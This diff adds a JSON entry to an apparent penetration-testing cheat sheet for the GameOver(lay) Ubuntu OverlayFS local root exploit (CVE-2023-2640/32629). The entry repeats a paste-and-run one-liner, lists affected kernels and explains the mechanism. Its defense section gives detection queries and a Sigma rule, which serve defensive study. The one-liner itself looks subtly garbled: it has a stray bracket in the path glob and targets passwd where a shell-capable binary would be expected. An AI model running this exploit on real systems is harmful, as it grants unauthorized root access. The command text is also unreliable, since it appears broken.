@@ -1,0 +1,94 @@
+{
+  "id": "linux-gameoverlay",
+  "name": "GameOver(lay) (CVE-2023-2640/CVE-2023-32629) - Ubuntu OverlayFS Privesc",
+  "command": "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd",
+  "description": "GameOver(lay) exploits Ubuntu-specific patches to OverlayFS (CVE-2023-2640 and CVE-2023-32629) that allow setting privileged extended attributes on files in an overlay filesystem from an unprivileged user namespace. This one-liner grants root on most Ubuntu kernels from 2023. Extremely easy to exploit - just paste and run.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "CVE-2023-2640/CVE-2023-32629; Wiz.io discovery",
+  "tags": [
+    "gameoverlay",
+    "cve-2023-2640",
+    "cve-2023-32629",
+    "overlayfs",
+    "ubuntu",
+    "user-namespace",
+    "capabilities"
+  ],
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== AFFECTED ===\nUbuntu kernels with OverlayFS patches:\n- Ubuntu 23.04 (Lunar) - kernel 6.2\n- Ubuntu 22.10 (Kinetic) - kernel 5.19\n- Ubuntu 22.04 (Jammy) - kernel 5.15-5.19\n- Ubuntu 20.04 (Focal) - kernel 5.4 (some versions)\nNOT affected: non-Ubuntu distros (they dont have the vuln patches)\n\n=== ONE-LINER EXPLOIT ===\n  unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd\n  # Instant root!\n\n=== HOW IT WORKS ===\n1. unshare -rm creates a user namespace with root inside\n2. Copies /usr/bin/passwd and sets cap_setuid capability\n3. Mounts an overlay filesystem\n4. The overlay trigger copies the capability to the upper dir\n5. The capability persists after leaving the namespace\n6. Running the capable binary grants root\n\n=== CHECK ===\n  uname -r   # Check kernel version\n  cat /etc/os-release  # Confirm Ubuntu",
+  "examples": [
+    {
+      "label": "One-liner root exploit",
+      "command": "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/passwd"
+    },
+    {
+      "label": "Check if Ubuntu kernel is affected",
+      "command": "uname -r && cat /etc/os-release | grep -i ubuntu"
+    }
+  ],
+  "references": [
+    {
+      "title": "Wiz.io - GameOver(lay)",
+      "url": "https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability"
+    },
+    {
+      "title": "CVE-2023-2640",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2640"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-exploit-suggester",
+      "note": "LES identifies GameOverlay among other kernel privesc CVEs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "dirty-pipe",
+      "note": "DirtyPipe for kernel 5.8+; GameOverlay for Ubuntu specifically.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Ubuntu-specific OverlayFS patches allowed privileged file capabilities to be set from within unprivileged user namespaces. The capabilities persist on the upper directory files after the overlay is unmounted.",
+    "prerequisites": "Ubuntu system with vulnerable kernel; user namespaces enabled (default).",
+    "impact": "Instant root from any unprivileged user; trivial one-liner exploitation.",
+    "detection": "[MITRE T1068] unshare with overlay mount; setcap in user namespace; file capability changes.",
+    "artifacts": "Process tree showing unshare -rm; overlay mount events; capability changes on binaries.",
+    "splunk_spl": "index=linux sourcetype=syslog (\"unshare\" AND \"overlay\") OR (\"setcap\" AND \"cap_setuid\")\n| table _time, host, process, message",
+    "elastic_kql": "process.name:\"unshare\" AND process.args:(\"-rm\" OR \"overlay\")",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has \"unshare\" and SyslogMessage has \"overlay\"\n| project TimeGenerated, HostName, SyslogMessage",
+    "sigma_rules": "linux_gameoverlay_cve_2023_2640",
+    "prevention": "Apply Ubuntu kernel updates; disable user namespaces if not needed (sysctl kernel.unprivileged_userns_clone=0); monitor for overlay mount abuse.",
+    "sources": [
+      "CVE-2023-2640",
+      "https://attack.mitre.org/techniques/T1068/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "GameOverlay OverlayFS privilege escalation",
+        "logic": "title: GameOverlay Ubuntu OverlayFS Privesc\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: /unshare\n    CommandLine|contains:\n      - \"-rm\"\n      - \"overlay\"\n  condition: selection\nlevel: critical",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1068"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Container runtimes using user namespaces; legitimate overlay mount operations",
+        "tuning": "Alert on non-container unshare with overlay; correlate with setcap events"
+      }
+    ]
+  }
+}
